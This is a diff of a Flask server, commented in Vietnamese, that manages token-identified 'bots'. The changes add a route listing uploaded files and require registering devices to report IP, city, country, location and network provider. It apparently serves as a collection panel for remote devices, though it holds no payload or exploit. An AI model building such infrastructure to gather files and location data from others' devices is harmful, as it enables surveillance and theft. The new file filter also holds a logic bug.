@@ -1,11 +1,6 @@
 import secrets
 from flask import Flask, request, jsonify, send_file
-import io
-import base64
 import requests
-import threading
-from apscheduler.schedulers.background import BackgroundScheduler
-import time
 
 app = Flask(__name__)
 
@@ -148,6 +143,30 @@ def upload_file(token):
         "message": f"File uploaded successfully by {bot['name']}",
         "download_token": unique_token
     }), 200
+@app.route('/api/<token>/files', methods=['GET'])
+def get_uploaded_files(token):
+    # Kiểm tra token có hợp lệ không
+    bot = bots.get(token)
+    if not bot:
+        return jsonify({"error": "Unauthorized: Invalid token"}), 401
+
+    # Lọc các file được lưu bởi token cụ thể
+    uploaded_files = [
+        {
+            "file_token": file_token,  # Token của file
+            "filename": file_data['filename'],  # Tên file
+        }
+        for file_token, file_data in file_store.items()
+        if file_token == token  # Chỉ lấy các file liên quan đến token này
+    ]
+
+    if not uploaded_files:
+        return jsonify({"message": "No files uploaded yet."}), 200
+
+    return jsonify({
+        "device_token": token,
+        "uploaded_files": uploaded_files
+    }), 200
 
 # @app.route('/download/<token>', methods=['GET'])
 # def download_file(token):
@@ -166,6 +185,8 @@ def upload_file(token):
 #         as_attachment=True,
 #         download_name=file_data['filename']
 #     )
+stored_devices = {}
+
 @app.route('/api/newdevice', methods=['POST'])
 def add_new_devices():
     # Lấy dữ liệu từ yêu cầu
@@ -180,53 +201,45 @@ def add_new_devices():
 
     for device in data:
         # Kiểm tra định dạng từng thiết bị
-        if 'token' not in device or 'name' not in device:
+        required_fields = ['token', 'name_device', 'IP', 'City', 'Area', 'Country', 'Location', 'Network_provider']
+        if not all(field in device for field in required_fields):
             failed_devices.append({"error": "Invalid device format.", "device": device})
             continue
 
         token = device['token']
-        name = device['name']
 
         # Kiểm tra nếu token đã tồn tại
-        if token in bots:
+        if token in stored_devices:
             failed_devices.append({"error": "Device with this token already exists.", "device": device})
             continue
 
         # Thêm thiết bị vào danh sách
-        bots[token] = {"name": name}
-        added_devices.append({"token": token, "name": name})
+        stored_devices[token] = {
+            "name_device": device['name_device'],
+            "IP": device['IP'],
+            "City": device['City'],
+            "Area": device['Area'],
+            "Country": device['Country'],
+            "Location": device['Location'],
+            "Network_provider": device['Network_provider']
+        }
+        added_devices.append({"token": token, "name_device": device['name_device']})
 
     return jsonify({
         "message": "Devices processed.",
         "added_devices": added_devices,
         "failed_devices": failed_devices
-    }), 201
-@app.route('/api/newdevice/info', methods=['POST'])
-def check_device_info():
-    # Lấy danh sách token từ yêu cầu
-    data = request.json
+    }), 200
 
-    # Kiểm tra dữ liệu đầu vào
-    if not data or not isinstance(data, list):
-        return jsonify({"error": "Invalid request. Expected a list of tokens."}), 400
-
-    results = []
-    for token in data:
-        if token in bots:
-            # Token tồn tại
-            results.append({
-                "token": token,
-                "name": bots[token]["name"],
-                "status": "found"
-            })
-        else:
-            # Token không tồn tại
-            results.append({
-                "token": token,
-                "status": "not found"
-            })
-
-    return jsonify({"devices": results}), 200
+@app.route('/api/newdevice/list', methods=['GET'])
+def list_devices():
+    # Trả về danh sách tất cả các thiết bị
+    devices = []
+    for token, info in stored_devices.items():
+        device = {"token": token}
+        device.update(info)
+        devices.append(device)
+    return jsonify({"devices": devices}), 200
 
 @app.route('/api/<token>/reset_data', methods=['GET'])
 def reset_data(token):
@@ -239,30 +252,7 @@ def reset_data(token):
     
     # Trả về phản hồi xác nhận
     return jsonify({"message": "Data has been reset successfully"}), 200
-@app.route('/api/<token>/files', methods=['GET'])
-def get_uploaded_files(token):
-    # Kiểm tra token có hợp lệ không
-    bot = bots.get(token)
-    if not bot:
-        return jsonify({"error": "Unauthorized: Invalid token"}), 401
 
-    # Tạo danh sách file đã upload cho bot (kèm token của file)
-    uploaded_files = []
-    for file_token, file_data in file_store.items():
-        # Tạo một dictionary với thông tin về file
-        uploaded_files.append({
-            "file_token": file_token,  # Token của file
-            "filename": file_data['filename'],  # Tên file
-            "device_token": token  # Token của device gửi file
-        })
-
-    if not uploaded_files:
-        return jsonify({"message": "No files uploaded yet."}), 200
-
-    return jsonify({
-        "device_token": token,
-        "uploaded_files": uploaded_files
-    }), 200
 
 if __name__ == '__main__':
     # Khởi động thread cập nhật bots
